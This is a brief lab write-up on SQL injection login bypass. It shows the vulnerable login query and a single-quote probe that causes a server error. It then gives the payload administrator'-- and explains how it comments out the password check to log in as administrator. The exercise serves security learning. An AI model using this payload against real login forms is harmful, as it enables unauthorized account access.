# Lab 2: SQL injection vulnerability allowing login bypass

# SQL injection vulnerability in the username selecting feature

SELECT * FROM users WHERE username = 'username' AND password = 'pass'

# End goal : access as the administrator

SELECT * FROM users WHERE username = 'username' AND password = 'pass'
this is the query performing for login functionality.

SELECT * FROM users WHERE username = ''' AND password = 'pass' --> internal server error 

SELECT * FROM users WHERE username = 'administrator'--' AND password = 'pass' -->payload = administrator'--

In above query we are directly communicating with the database for username as adminstrator and ' quote for end the username query and -- for the comment out the remaining query for authentication!!!



